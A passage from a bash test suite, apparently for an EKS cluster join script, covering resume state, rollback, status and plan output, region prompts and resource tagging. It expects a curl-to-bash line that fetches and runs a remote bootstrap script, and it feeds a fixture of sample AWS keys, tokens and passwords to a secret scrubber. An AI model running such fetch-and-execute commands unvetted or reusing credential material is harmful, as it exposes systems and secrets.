pass "a local join keeps its own resume state"
LOCAL=0

reset_join_flags
rm -rf "${WORK}/state"
mkdir -p "${WORK}/state/pds"
legacy="$(legacy_state_path spoke-a us-west-2)"
cat >"$legacy" <<EOF
PHASE_LAST='creating the EKS cluster'
STATE_CLUSTER=1
STATE_NODEGROUP=0
STATE_BUCKET=0
STATE_FLUX=0
STATE_AGENT=0
STATE_IAM_USER=0
STATE_PLATFORM=0
EOF
load_state >/dev/null
[[ "${PHASE_LAST}" == "creating the EKS cluster" ]] \
  || fail "load_state ignored a state file from before account scoping: ${PHASE_LAST:-empty}"
[[ "${STATE_CLUSTER:-0}" == 1 ]] \
  || fail "load_state dropped ownership from a state file from before account scoping"
save_state
[[ -f "$(state_path spoke-a us-west-2)" ]] \
  || fail "save_state did not migrate a state file from before account scoping"
[[ ! -f "$legacy" ]] \
  || fail "save_state left a state file from before account scoping in place"
pass "load_state still reads a state file from before account scoping"

reset_join_flags
ON_FAILURE="rollback"
CREATED_CLUSTER=1
PHASE="creating the EKS cluster"
save_state
state_file="$(state_path spoke-a us-west-2)"
export FAKE_EKSCTL_RC=1
(
  false
  on_exit
) 2>"${WORK}/rollback-fail.err" || true
unset FAKE_EKSCTL_RC
[[ -f "$state_file" ]] \
  || fail "rollback cleared resume state after a failed delete"
grep -q "Resume state was kept" "${WORK}/rollback-fail.err" \
  || fail "rollback did not say the resume state was kept: $(cat "${WORK}/rollback-fail.err")"
pass "rollback keeps resume state when a delete fails"

reset_join_flags
load_state >"${WORK}/resume.out" 2>&1
[[ "${PHASE_LAST}" == "creating the EKS cluster" ]] \
  || fail "load_state did not report where the last run stopped: ${PHASE_LAST:-empty}"
[[ "${STATE_CLUSTER:-0}" == 1 ]] \
  || fail "load_state did not carry what the last run created: ${STATE_CLUSTER:-unset}"
grep -q "creating the EKS cluster" "${WORK}/resume.out" \
  || fail "the run did not say where the last one stopped: $(cat "${WORK}/resume.out")"
pass "load_state reports where the last run stopped and what it created"

# A resumed run calls phase, which rewrites the state file from this
# process's zero CREATED_* flags. The loaded STATE_* flags have to survive
# that write, or --status forgets what the earlier attempt built.
reset_join_flags
load_state >/dev/null
CREATED_CLUSTER=0
PHASE="checking prerequisites"
save_state
grep -q "STATE_CLUSTER=1" "$(state_path spoke-a us-west-2)" \
  || fail "a resumed run forgot that an earlier attempt created the cluster: $(cat "$(state_path spoke-a us-west-2)")"
[[ "$CREATED_CLUSTER" == 0 ]] \
  || fail "save_state told this run it had created a cluster it did not"
pass "a resumed run keeps the earlier attempt's ownership flags"

reset_join_flags
STATE_CLUSTER=1
STATE_BUCKET=1
CREATED_CLUSTER=0
CREATED_BUCKET=0
PHASE="checking prerequisites"
(
  false
  on_exit
) 2>"${WORK}/resume-keep.err" || true
grep -qF "bash -s -- --delete --name spoke-a --region us-west-2" "${WORK}/resume-keep.err" \
  || fail "a resumed keep path did not offer the delete command for what an earlier attempt created: $(cat "${WORK}/resume-keep.err")"
grep -q "on-failure rollback" "${WORK}/resume-keep.err" \
  && fail "a resumed keep path offered rollback for resources this process did not create: $(cat "${WORK}/resume-keep.err")"
pass "a resumed keep path offers the delete command for inherited resources without offering rollback"

# A control plane an earlier run built can be in service by the time anyone
# runs the command again. Reading that record must never license deleting it.
[[ "$CREATED_CLUSTER" == 0 ]] \
  || fail "load_state told this run it had created a cluster it did not"
ON_FAILURE="rollback"
: >"${WORK}/calls"
(
  false
  on_exit
) 2>/dev/null || true
grep -q "eksctl delete cluster" "${WORK}/calls" \
  && fail "rollback deleted a cluster an earlier run created: $(cat "${WORK}/calls")"
pass "rollback never deletes a cluster it only inherited a record of"

reset_join_flags
save_state
[[ -f "$(state_path spoke-a us-west-2)" ]] || fail "save_state wrote nothing to clear"
(
  true
  on_exit
)
[[ ! -f "$(state_path spoke-a us-west-2)" ]] \
  || fail "a successful join left its resume state behind"
pass "a successful join clears its resume state"

# --status and --dry-run exit 0 without joining anything. Clearing on that
# exit would spend the enrollment the next run resumes from and the record of
# where the last one stopped, so reading the state would destroy it.
for read_only in STATUS_ONLY DRY_RUN; do
  reset_join_flags
  ENROLL_CACHE="${WORK}/enroll-read-only.json"
  printf '%s' '{"cluster":"spoke-a"}' >"$ENROLL_CACHE"
  PHASE="creating the EKS cluster"
  save_state
  (
    export "${read_only}=1"
    true
    on_exit
  )
  [[ -f "$(state_path spoke-a us-west-2)" ]] \
    || fail "--${read_only} deleted the resume state it was only reading"
  [[ -f "$ENROLL_CACHE" ]] \
    || fail "--${read_only} deleted the enrollment the next run resumes from"
done
ENROLL_CACHE=""
pass "reading the state does not spend the enrollment or the resume state"

# --- progress the operator can read ---
reset_join_flags
PHASE_NUMBER=0
RUN_STARTED="$(now_seconds)"
phase "creating the EKS cluster" >"${WORK}/phase.out"
grep -qE '\[1/[0-9]+\] creating the EKS cluster' "${WORK}/phase.out" \
  || fail "phase printed no numbered banner: $(cat "${WORK}/phase.out")"
grep -qE '[0-9]+m[0-9][0-9]s' "${WORK}/phase.out" \
  || fail "phase printed no elapsed time: $(cat "${WORK}/phase.out")"
[[ "$PHASE" == "creating the EKS cluster" ]] || fail "phase did not record the phase"
pass "each phase prints a numbered banner with elapsed time"

reset_join_flags
READY_NODE_TIMEOUT=1
RUN_STARTED="$(now_seconds)"
if wait_for_ready_nodes >"${WORK}/ready.out" 2>&1; then
  fail "wait_for_ready_nodes reported Ready nodes when this cluster has none"
fi
grep -q "waiting" "${WORK}/ready.out" \
  || fail "the Ready node wait printed no heartbeat: $(cat "${WORK}/ready.out")"
grep -qE '[0-9]+m[0-9][0-9]s' "${WORK}/ready.out" \
  || fail "the Ready node wait printed no elapsed time: $(cat "${WORK}/ready.out")"
pass "the Ready node wait prints a heartbeat rather than going silent"

# Without a kubeconfig every node read is silently empty, so the wait used to
# sit out its whole timeout and then report a cluster with no Ready nodes. The
# cluster is fine; this run simply cannot see it, and saying so at once saves
# ten minutes of a join that cannot finish.
reset_join_flags
READY_NODE_TIMEOUT=600
RUN_STARTED="$(now_seconds)"
(
  trap - EXIT
  kubectl() { [[ "$1" != "config" ]]; }
  wait_for_ready_nodes >"${WORK}/noconfig.out" 2>&1
) && fail "the Ready node wait passed with no kubeconfig: $(cat "${WORK}/noconfig.out")"
grep -q "no Kubernetes cluster" "${WORK}/noconfig.out" \
  || fail "the Ready node wait blamed the nodes: $(cat "${WORK}/noconfig.out")"
grep -q "waiting" "${WORK}/noconfig.out" \
  && fail "the Ready node wait waited on a cluster it cannot reach"
pass "the Ready node wait stops at once when there is no kubeconfig"

reset_join_flags
FAKE_CLUSTER_STATUS="ACTIVE" FAKE_NODEGROUP_STATUS="ACTIVE" \
  FAKE_EXISTING_BUCKETS="pds-123456789012-spoke-a" \
  print_status >"${WORK}/status.out" 2>&1
grep -q "spoke-a" "${WORK}/status.out" \
  || fail "print_status did not name the cluster: $(cat "${WORK}/status.out")"
grep -q "ACTIVE" "${WORK}/status.out" \
  || fail "print_status did not report the cluster status: $(cat "${WORK}/status.out")"
grep -q "Flux" "${WORK}/status.out" \
  && fail "print_status named Flux to the customer: $(cat "${WORK}/status.out")"
grep -q "Git reconciliation" "${WORK}/status.out" \
  || fail "print_status did not report Git reconciliation: $(cat "${WORK}/status.out")"
for verb in "eksctl create" "eksctl delete" "kubectl apply" "helm install" "helm upgrade" "rb s3"; do
  grep -q "$verb" "${WORK}/calls" \
    && fail "print_status ran a command that changes something (${verb}): $(cat "${WORK}/calls")"
done
pass "status prints what exists and touches nothing"

reset_join_flags
FAKE_CLUSTER_STATUS="ACTIVE" FAKE_NODEGROUP_STATUS="ACTIVE" \
  print_status >"${WORK}/status-unowned.out" 2>&1
grep -q -- "--delete" "${WORK}/status-unowned.out" \
  && fail "status printed a delete when this machine recorded creating nothing: $(cat "${WORK}/status-unowned.out")"
STATE_CLUSTER=1
STATE_BUCKET=1
print_status >"${WORK}/status-owned.out" 2>&1
grep -qF "curl -fsSL '${HUB_URL}/api/internal/connect/bootstrap.sh' | bash -s -- --delete --name spoke-a --region us-west-2" "${WORK}/status-owned.out" \
  || fail "status did not print the delete command for what this machine recorded creating: $(cat "${WORK}/status-owned.out")"
grep -q "eksctl delete cluster\|aws s3 rb\|aws iam delete" "${WORK}/status-owned.out" \
  && fail "status still prints a hand-copied delete step: $(cat "${WORK}/status-owned.out")"
pass "status prints the delete command only when this machine recorded creating something"

reset_join_flags
FAKE_CLUSTER_STATUS="ABSENT" print_plan >"${WORK}/plan.out" 2>&1
grep -q "spoke-a" "${WORK}/plan.out" \
  || fail "print_plan did not name the cluster it would create: $(cat "${WORK}/plan.out")"
grep -q "in us-west-2" "${WORK}/plan.out" \
  || fail "print_plan did not name the region: $(cat "${WORK}/plan.out")"
grep -q "pds-123456789012-spoke-a" "${WORK}/plan.out" \
  || fail "print_plan did not name the bucket it would create: $(cat "${WORK}/plan.out")"
grep -q "Flux" "${WORK}/plan.out" \
  && fail "print_plan named Flux to the customer: $(cat "${WORK}/plan.out")"
grep -q "Git reconciliation" "${WORK}/plan.out" \
  || fail "print_plan did not name Git reconciliation: $(cat "${WORK}/plan.out")"
for verb in "eksctl create" "eksctl delete" "kubectl apply" "helm install" "helm upgrade"; do
  grep -q "$verb" "${WORK}/calls" \
    && fail "print_plan ran a command that changes something (${verb}): $(cat "${WORK}/calls")"
done
pass "the plan names what would be created and creates nothing"

cat >"${FAKE}/helm" <<'EOF'
#!/usr/bin/env bash
if [[ "$1" == "status" ]]; then
  case " ${FAKE_DEPLOYED_RELEASES:-} " in
    *" $2 "*) echo '{"info":{"status":"deployed"}}'; exit 0 ;;
  esac
  exit 1
fi
exit 0
EOF
chmod +x "${FAKE}/helm"
reset_join_flags
PLATFORM_RELEASE="pds"
PLATFORM_RELEASE_NAMED=0
export FAKE_DEPLOYED_RELEASES="percona-services" # allow-legacy-name
FAKE_CLUSTER_STATUS="ACTIVE" FAKE_NODEGROUP_STATUS="ACTIVE" \
  print_status >"${WORK}/status-legacy.out" 2>&1
unset FAKE_DEPLOYED_RELEASES
grep -q "Percona Database Service: installed" "${WORK}/status-legacy.out" \
  || fail "print_status missed a platform release from before the rename: $(cat "${WORK}/status-legacy.out")"
pass "status sees a platform release from before the rename"

# --- the region is asked before anything is created ---
# The join is a curl pipe, so stdin is the script. These drivers answer on
# a terminal the way a pasted command does. A run with no terminal is a
# separate process that has no controlling tty.

write_region_driver() {
  local path="$1"
  shift
  cat >"$path" <<EOS
#!/usr/bin/env bash
set -euo pipefail
source "${WORK}/functions.sh"
export PATH="${FAKE}:\$PATH"
tmp="${WORK}/region-tmp"
mkdir -p "\$tmp"
unset AWS_REGION AWS_DEFAULT_REGION
export FAKE_CONFIGURED_REGION=""
export FAKE_REGIONS="\${FAKE_REGIONS:-us-west-2 us-east-1 eu-central-1 eu-west-1}"
export FAKE_DESCRIBE_REGIONS_RC="\${FAKE_DESCRIBE_REGIONS_RC:-0}"
export FAKE_CLUSTER_STATUS="\${FAKE_CLUSTER_STATUS:-ABSENT}"
REGION_FROM_FLAG=0
LOCAL=0
NAME="spoke-a"
NODEGROUP="ng-1"
NODES=3
NODE_TYPE="t3.2xlarge"
BUCKET=""
PLATFORM_RELEASE="pds"
PLATFORM_RELEASE_NAMED=0
PLATFORM_NAMESPACE="everest-system"
FLUX_VERSION="2.5.1"
KUBERNETES_VERSION="1.34"
PUBLIC_NODES=0
AWS_ACCOUNT_ID=""
XDG_STATE_HOME="${WORK}/region-state"
EOS
  printf '%s\n' "$@" >>"$path"
}

# run_with_tty runs a driver on a terminal and writes the answer once the
# region prompt is showing. It exits with the driver's status.
run_with_tty() {
  local answers="$1"
  local driver="$2"
  python3 - "$answers" "$driver" <<'PY'
import os, pty, select, sys, time
answers = sys.argv[1].encode()
driver = sys.argv[2]
pid, master = pty.fork()
if pid == 0:
    os.execvp("bash", ["bash", driver])
out = b""
sent = False
deadline = time.time() + 8
status = None
while time.time() < deadline:
    ready, _, _ = select.select([master], [], [], 0.2)
    if master in ready:
        try:
            chunk = os.read(master, 4096)
        except OSError:
            chunk = b""
        if chunk:
            out += chunk
            if not sent and b"AWS region [" in out:
                os.write(master, answers)
                sent = True
    try:
        wpid, st = os.waitpid(pid, os.WNOHANG)
    except ChildProcessError:
        break
    if wpid:
        status = st
        break
else:
    try:
        os.kill(pid, 15)
    except OSError:
        pass
    sys.stderr.write("region prompt timed out\n")
    sys.stdout.buffer.write(out)
    sys.exit(124)
while True:
    ready, _, _ = select.select([master], [], [], 0.05)
    if not ready:
        break
    try:
        chunk = os.read(master, 4096)
    except OSError:
        break
    if not chunk:
        break
    out += chunk
sys.stdout.buffer.write(out)
if status is not None and os.WIFEXITED(status):
    sys.exit(os.WEXITSTATUS(status))
sys.exit(1)
PY
}

run_without_tty() {
  local driver="$1"
  python3 - "$driver" <<'PY'
import subprocess, sys
try:
    proc = subprocess.run(
        ["bash", sys.argv[1]],
        start_new_session=True,
        stdin=subprocess.DEVNULL,
        capture_output=True,
        timeout=5,
    )
except subprocess.TimeoutExpired as exc:
    sys.stdout.buffer.write(exc.stdout or b"")
    sys.stderr.buffer.write(exc.stderr or b"")
    sys.stderr.write("region prompt hung with no terminal\n")
    sys.exit(124)
sys.stdout.buffer.write(proc.stdout)
sys.stderr.buffer.write(proc.stderr)
sys.exit(proc.returncode)
PY
}

write_region_driver "${WORK}/region-config.sh" \
  'export FAKE_CONFIGURED_REGION=eu-west-1' \
  'choose_region "us-west-2"' \
  'printf "CHOSEN:%s\n" "$REGION"'
: >"${WORK}/calls"
set +e
run_with_tty $'\n' "${WORK}/region-config.sh" >"${WORK}/region-config.out" 2>"${WORK}/region-config.err"
region_rc=$?
set -e
[[ "$region_rc" -eq 0 ]] \
  || fail "an empty answer failed (${region_rc}): $(cat "${WORK}/region-config.out" "${WORK}/region-config.err")"
grep -q "AWS region \[eu-west-1\]" "${WORK}/region-config.out" \
  || fail "the prompt did not show the AWS configuration region: $(cat "${WORK}/region-config.out")"
grep -q "CHOSEN:eu-west-1" "${WORK}/region-config.out" \
  || fail "an empty answer did not use the AWS configuration region: $(cat "${WORK}/region-config.out")"
grep -q "us-west-2" "${WORK}/region-config.out" \
  && fail "the prompt offered the baked-in region when AWS configuration has one: $(cat "${WORK}/region-config.out")"
pass "the prompt shows the AWS configuration region and an empty answer uses it"

write_region_driver "${WORK}/region-env.sh" \
  'export AWS_REGION=eu-central-1' \
  'export FAKE_CONFIGURED_REGION=eu-west-1' \
  'choose_region "us-west-2"' \
  'printf "CHOSEN:%s\n" "$REGION"'
: >"${WORK}/calls"
set +e
run_with_tty $'\n' "${WORK}/region-env.sh" >"${WORK}/region-env.out" 2>"${WORK}/region-env.err"
region_rc=$?
set -e
[[ "$region_rc" -eq 0 ]] \
  || fail "the environment region failed (${region_rc}): $(cat "${WORK}/region-env.out" "${WORK}/region-env.err")"
grep -q "AWS region \[eu-central-1\]" "${WORK}/region-env.out" \
  || fail "the prompt did not show AWS_REGION: $(cat "${WORK}/region-env.out")"
grep -q "CHOSEN:eu-central-1" "${WORK}/region-env.out" \
  || fail "an empty answer did not use AWS_REGION: $(cat "${WORK}/region-env.out")"
grep -q "configure get region" "${WORK}/calls" \
  && fail "AWS_REGION still consulted the config file: $(cat "${WORK}/calls")"
pass "AWS_REGION is the default when it is set"

write_region_driver "${WORK}/region-hub.sh" \
  'choose_region "us-west-2"' \
  'printf "CHOSEN:%s\n" "$REGION"'
: >"${WORK}/calls"
set +e
run_with_tty $'\n' "${WORK}/region-hub.sh" >"${WORK}/region-hub.out" 2>"${WORK}/region-hub.err"
region_rc=$?
set -e
[[ "$region_rc" -eq 0 ]] \
  || fail "the fallback region failed (${region_rc}): $(cat "${WORK}/region-hub.out" "${WORK}/region-hub.err")"
grep -q "AWS region \[us-west-2\]" "${WORK}/region-hub.out" \
  || fail "the prompt did not show the baked-in region: $(cat "${WORK}/region-hub.out")"
grep -q "CHOSEN:us-west-2" "${WORK}/region-hub.out" \
  || fail "an empty answer did not use the baked-in region: $(cat "${WORK}/region-hub.out")"
pass "an empty answer uses the baked-in region when AWS configuration has none"

write_region_driver "${WORK}/region-override.sh" \
  'choose_region "us-west-2"' \
  'printf "CHOSEN:%s\n" "$REGION"' \
  'FAKE_CLUSTER_STATUS=ABSENT print_plan' \
  'path="$(state_path "$NAME" "$REGION")"' \
  'printf "STATE:%s\n" "$path"' \
  'resolve_spoke_bucket >/dev/null' \
  'write_new_cluster_config >/dev/null'
: >"${WORK}/calls"
set +e
run_with_tty $'eu-central-1\n' "${WORK}/region-override.sh" >"${WORK}/region-override.out" 2>"${WORK}/region-override.err"
region_rc=$?
set -e
[[ "$region_rc" -eq 0 ]] \
  || fail "a typed region failed (${region_rc}): $(cat "${WORK}/region-override.out" "${WORK}/region-override.err")"
grep -q "CHOSEN:eu-central-1" "${WORK}/region-override.out" \
  || fail "a typed region was not used: $(cat "${WORK}/region-override.out")"
grep -q "in eu-central-1" "${WORK}/region-override.out" \
  || fail "the plan did not name the typed region: $(cat "${WORK}/region-override.out")"
grep -q "STATE:.*eu-central-1" "${WORK}/region-override.out" \
  || fail "the state file did not use the typed region: $(cat "${WORK}/region-override.out")"
grep -q "head-bucket --bucket pds-123456789012-spoke-a --region eu-central-1" "${WORK}/calls" \
  || fail "the bucket lookup did not use the typed region: $(cat "${WORK}/calls")"
grep -q "region: eu-central-1" "${WORK}/region-tmp/cluster.yaml" \
  || fail "the cluster config did not use the typed region: $(cat "${WORK}/region-tmp/cluster.yaml" 2>/dev/null)"
grep -q "name: ng-1" "${WORK}/region-tmp/cluster.yaml" \
  || fail "the node group config was not written in the chosen region: $(cat "${WORK}/region-tmp/cluster.yaml" 2>/dev/null)"
for verb in "eksctl create" "eksctl delete" "create-bucket" "kubectl apply" "helm install" "helm upgrade"; do
  grep -q "$verb" "${WORK}/calls" \
    && fail "choosing a region created something (${verb}): $(cat "${WORK}/calls")"
done
pass "a typed region is used for the plan, the cluster, the node group, the bucket and the state file"

write_region_driver "${WORK}/region-invalid.sh" \
  'choose_region "us-west-2"' \
  'printf "CHOSEN:%s\n" "$REGION"'
: >"${WORK}/calls"
set +e
run_with_tty $'not-a-region\neu-central-1\n' "${WORK}/region-invalid.sh" >"${WORK}/region-invalid.out" 2>"${WORK}/region-invalid.err"
region_rc=$?
set -e
[[ "$region_rc" -eq 0 ]] \
  || fail "a corrected region failed (${region_rc}): $(cat "${WORK}/region-invalid.out" "${WORK}/region-invalid.err")"
grep -q "not-a-region is not a region this account can use." "${WORK}/region-invalid.out" \
  || fail "an invalid region was not refused: $(cat "${WORK}/region-invalid.out")"
grep -q "CHOSEN:eu-central-1" "${WORK}/region-invalid.out" \
  || fail "the prompt did not accept the corrected region: $(cat "${WORK}/region-invalid.out")"
# The refusal has to come back before the answer is accepted, or a bad
# region would be the one that gets created.
refusal_at="$(grep -n "not a region this account can use" "${WORK}/region-invalid.out" | head -1 | cut -d: -f1)"
chosen_at="$(grep -n "CHOSEN:eu-central-1" "${WORK}/region-invalid.out" | head -1 | cut -d: -f1)"
[[ -n "$refusal_at" && -n "$chosen_at" && "$refusal_at" -lt "$chosen_at" ]] \
  || fail "the prompt did not repeat before accepting a region: $(cat "${WORK}/region-invalid.out")"
for verb in "eksctl create" "eksctl delete" "create-bucket" "kubectl apply"; do
  grep -q "$verb" "${WORK}/calls" \
    && fail "an invalid region created something (${verb}): $(cat "${WORK}/calls")"
done
pass "an invalid region is refused and the prompt repeats, with nothing created"

write_region_driver "${WORK}/region-unlistable.sh" \
  'export FAKE_DESCRIBE_REGIONS_RC=1' \
  'choose_region "us-west-2"' \
  'printf "CHOSEN:%s\n" "$REGION"'
: >"${WORK}/calls"
set +e
run_with_tty $'\n' "${WORK}/region-unlistable.sh" >"${WORK}/region-unlistable.out" 2>"${WORK}/region-unlistable.err"
region_rc=$?
set -e
[[ "$region_rc" -ne 0 ]] \
  || fail "an unlistable account still chose a region: $(cat "${WORK}/region-unlistable.out")"
grep -q "could not list the regions this account can use." "${WORK}/region-unlistable.out" "${WORK}/region-unlistable.err" \
  || fail "an unlistable account was not explained: $(cat "${WORK}/region-unlistable.out" "${WORK}/region-unlistable.err")"
grep -q "CHOSEN:" "${WORK}/region-unlistable.out" \
  && fail "an unlistable account continued: $(cat "${WORK}/region-unlistable.out")"
grep -q "eksctl" "${WORK}/calls" \
  && fail "an unlistable account created a cluster: $(cat "${WORK}/calls")"
pass "a region list this account cannot read stops before anything is created"

write_region_driver "${WORK}/region-flag.sh" \
  'REGION="eu-central-1"' \
  'REGION_FROM_FLAG=1' \
  'choose_region "us-west-2"' \
  'printf "CHOSEN:%s\n" "$REGION"'
: >"${WORK}/calls"
set +e
run_with_tty $'us-east-1\n' "${WORK}/region-flag.sh" >"${WORK}/region-flag.out" 2>"${WORK}/region-flag.err"
region_rc=$?
set -e
[[ "$region_rc" -eq 0 ]] \
  || fail "--region failed (${region_rc}): $(cat "${WORK}/region-flag.out" "${WORK}/region-flag.err")"
grep -q "CHOSEN:eu-central-1" "${WORK}/region-flag.out" \
  || fail "--region did not keep the flag value: $(cat "${WORK}/region-flag.out")"
grep -q "AWS region \[" "${WORK}/region-flag.out" \
  && fail "--region still prompted: $(cat "${WORK}/region-flag.out")"
grep -q "describe-regions" "${WORK}/calls" \
  && fail "--region listed regions: $(cat "${WORK}/calls")"
pass "--region skips the prompt"

write_region_driver "${WORK}/region-notty.sh" \
  'export FAKE_CONFIGURED_REGION=eu-west-1' \
  'choose_region "us-west-2"' \
  'printf "CHOSEN:%s\n" "$REGION"'
: >"${WORK}/calls"
set +e
run_without_tty "${WORK}/region-notty.sh" >"${WORK}/region-notty.out" 2>"${WORK}/region-notty.err"
region_rc=$?
set -e
[[ "$region_rc" -eq 0 ]] \
  || fail "a run with no terminal failed (${region_rc}): $(cat "${WORK}/region-notty.out" "${WORK}/region-notty.err")"
grep -q "CHOSEN:eu-west-1" "${WORK}/region-notty.out" \
  || fail "a run with no terminal did not use the AWS configuration region: $(cat "${WORK}/region-notty.out")"
grep -q "AWS region \[" "${WORK}/region-notty.out" "${WORK}/region-notty.err" \
  && fail "a run with no terminal still prompted: $(cat "${WORK}/region-notty.out" "${WORK}/region-notty.err")"
grep -q "Device not configured" "${WORK}/region-notty.err" \
  && fail "a run with no terminal reported a tty error: $(cat "${WORK}/region-notty.err")"
grep -q "describe-regions" "${WORK}/calls" \
  && fail "a run with no terminal waited on a region list: $(cat "${WORK}/calls")"
pass "a run with no terminal uses the default and does not hang"

write_region_driver "${WORK}/region-notty-hub.sh" \
  'choose_region "us-west-2"' \
  'printf "CHOSEN:%s\n" "$REGION"'
set +e
run_without_tty "${WORK}/region-notty-hub.sh" >"${WORK}/region-notty-hub.out" 2>"${WORK}/region-notty-hub.err"
region_rc=$?
set -e
[[ "$region_rc" -eq 0 ]] \
  || fail "a run with no terminal and no AWS region failed (${region_rc}): $(cat "${WORK}/region-notty-hub.out" "${WORK}/region-notty-hub.err")"
grep -q "CHOSEN:us-west-2" "${WORK}/region-notty-hub.out" \
  || fail "a run with no terminal did not fall back to the baked-in region: $(cat "${WORK}/region-notty-hub.out")"
pass "a run with no terminal and no AWS region uses the baked-in default"

LOCAL=1
REGION="us-west-2"
REGION_FROM_FLAG=0
choose_region "eu-west-1"
[[ "$REGION" == "us-west-2" ]] \
  || fail "--local changed the region to ${REGION}"
LOCAL=0
pass "--local does not ask for a region"

choose_at="$(grep -n '^choose_region ' "${SCRIPT}" | head -1 | cut -d: -f1)"
enroll_at="$(grep -n 'enroll="$(load_enrollment ' "${SCRIPT}" | head -1 | cut -d: -f1)"
preview_at="$(grep -n 'enroll="$(preview_enrollment ' "${SCRIPT}" | head -1 | cut -d: -f1)"
bucket_at="$(grep -n 'BUCKET="$(resolve_spoke_bucket)"' "${SCRIPT}" | head -1 | cut -d: -f1)"
state_at="$(grep -n '^load_state$' "${SCRIPT}" | head -1 | cut -d: -f1)"
cluster_at="$(grep -n '^  ensure_cluster$' "${SCRIPT}" | head -1 | cut -d: -f1)"
[[ -n "$choose_at" && -n "$enroll_at" && "$choose_at" -lt "$enroll_at" ]] \
  || fail "the region is chosen after enrollment (${choose_at} vs ${enroll_at})"
[[ -n "$preview_at" && "$choose_at" -lt "$preview_at" ]] \
  || fail "the region is chosen after the dry-run preview (${choose_at} vs ${preview_at})"
[[ -n "$bucket_at" && "$choose_at" -lt "$bucket_at" ]] \
  || fail "the region is chosen after the bucket name (${choose_at} vs ${bucket_at})"
[[ -n "$state_at" && "$choose_at" -lt "$state_at" ]] \
  || fail "the region is chosen after resume state is read (${choose_at} vs ${state_at})"
[[ -n "$cluster_at" && "$choose_at" -lt "$cluster_at" ]] \
  || fail "the region is chosen after the cluster create (${choose_at} vs ${cluster_at})"
awk '
  $0 ~ /^[[:space:]]*--region\)/ { inregion = 1 }
  inregion && /REGION_FROM_FLAG=1/ { found = 1 }
  inregion && /^[[:space:]]*;;/ { exit }
  END { exit found ? 0 : 1 }
' "${SCRIPT}" \
  || fail "--region does not record that the flag was passed"
grep -q 'create EKS cluster ${NAME} in ${REGION}' "${SCRIPT}" \
  || fail "the plan does not name the region"
grep -q 'nodes in ${REGION}' "${SCRIPT}" \
  || fail "the create announcement does not name the region before eksctl runs"
pass "the region is chosen before enrollment, the bucket, the state file and the cluster"

fixture=$'AKIAIOSFODNN7EXAMPLE\nASIAIOSFODNN7EXAMPLE\naws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nAWS_SECRET_ACCESS_KEY=UPPERCASESECRETVALUEexample\npassword=s3cret\npassword="secret with spaces"\ntoken: jnt_live\nAuthorization: Bearer opaque-token-value\nclient-key-data: LS0tLS1CRUdJTi\n-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----'
scrubbed="$(printf '%s' "$fixture" | scrub_tail)"
for secret in AKIAIOSFODNN7EXAMPLE ASIAIOSFODNN7EXAMPLE 'wJalrXUtnFEMI' UPPERCASESECRETVALUEexample s3cret 'secret with spaces' jnt_live opaque-token-value LS0tLS1CRUdJTi 'BEGIN RSA PRIVATE KEY'; do
  printf '%s' "$scrubbed" | grep -q "$secret" && fail "scrub_tail kept ${secret}"
done
pass "scrub_tail removes keys, tokens, kubeconfig data and passwords"

# --- the CSI role stack, the bucket and the backup user carry the tag ---
reset_join_flags
ensure_ebs_csi_iam >/dev/null
grep -q "create iamserviceaccount .*--tags percona.com/pds=spoke-a" "${WORK}/calls" \
  || fail "the CSI role stack is not tagged: $(cat "${WORK}/calls")"
[[ "$CREATED_CSI_STACK" == 1 ]] \
  || fail "ensure_ebs_csi_iam did not record that it created the CSI role stack"
pass "ensure_ebs_csi_iam tags the CSI role stack and records that it made it"

reset_join_flags
echo "eksctl-spoke-a-addon-iamserviceaccount-kube-system-ebs-csi-controller-sa" >"${WORK}/fake-stacks"
ensure_ebs_csi_iam >/dev/null
[[ "$CREATED_CSI_STACK" == 0 ]] \
  || fail "ensure_ebs_csi_iam claimed a CSI role stack that was already there"
pass "ensure_ebs_csi_iam does not claim a CSI role stack it found"

reset_join_flags
echo "eksctl-spoke-a-addon-iamserviceaccount-kube-system-ebs-csi-controller-sa" >"${WORK}/fake-stacks"
FAKE_STACK_ERR_ONCE=1 ensure_ebs_csi_iam >/dev/null
[[ "$CREATED_CSI_STACK" == 0 ]] \
  || fail "ensure_ebs_csi_iam claimed a CSI role stack after a describe call that failed for another reason than absence"
pass "ensure_ebs_csi_iam claims a stack only when it was reported absent"

reset_join_flags
FAKE_HEAD_BUCKET_RC=1 ensure_spoke_bucket "pds-fresh" >/dev/null
grep "put-bucket-tagging --bucket pds-fresh" "${WORK}/calls" | grep -q "Key=percona.com/pds,Value=spoke-a" \
  || fail "a bucket the join created is not tagged: $(cat "${WORK}/calls")"
pass "ensure_spoke_bucket tags the bucket it creates"

reset_join_flags
FAKE_HEAD_BUCKET_RC=0 ensure_spoke_bucket "pds-existing" >/dev/null
grep -q "put-bucket-tagging" "${WORK}/calls" \
  && fail "ensure_spoke_bucket replaced the tags of a bucket it did not create"
pass "ensure_spoke_bucket leaves the tags of an existing bucket alone"

reset_join_flags
FAKE_HEAD_BUCKET_RC=1 FAKE_PUT_TAGGING_RC=1 ensure_spoke_bucket "pds-fresh" >"${WORK}/tagging.out" 2>&1 \
  || fail "a bucket that could not be tagged failed the join: $(cat "${WORK}/tagging.out")"
[[ "$CREATED_BUCKET" == 1 ]] \
  || fail "an untagged bucket was not recorded as created, so a rollback would leave it"
grep -q "could not tag" "${WORK}/tagging.out" \
  || fail "a bucket that could not be tagged said nothing: $(cat "${WORK}/tagging.out")"
pass "ensure_spoke_bucket warns when it cannot tag and carries on"

unset BACKUP_ACCESS_KEY_ID BACKUP_SECRET_ACCESS_KEY
reset_join_flags
ensure_spoke_identity "pds-spoke-a" >/dev/null
grep "iam create-user" "${WORK}/calls" | grep -q "Key=percona.com/pds,Value=spoke-a" \
  || fail "the backup user is not tagged with its cluster: $(cat "${WORK}/calls")"
grep "iam create-user" "${WORK}/calls" | grep -q "Key=pds-cluster,Value=spoke-a" \
  || fail "the backup user lost the tag clusters joined before this change carry"
pass "ensure_spoke_identity tags the backup user with the ownership tag"

reset_join_flags
FAKE_EXISTING_USERS="pds-spoke-a" FAKE_USER_TAGS="pds-spoke-a:pds" ensure_spoke_identity "pds-spoke-a" >/dev/null
grep "iam tag-user --user-name pds-spoke-a" "${WORK}/calls" | grep -q "Key=percona.com/pds,Value=spoke-a" \
  || fail "a backup user from an earlier join was not given the ownership tag: $(cat "${WORK}/calls")"
pass "ensure_spoke_identity tags a backup user from an earlier join"

# --- the state file remembers the CSI role stack and the minted key ---
rm -rf "${WORK}/state"
reset_join_flags
CREATED_CSI_STACK=1
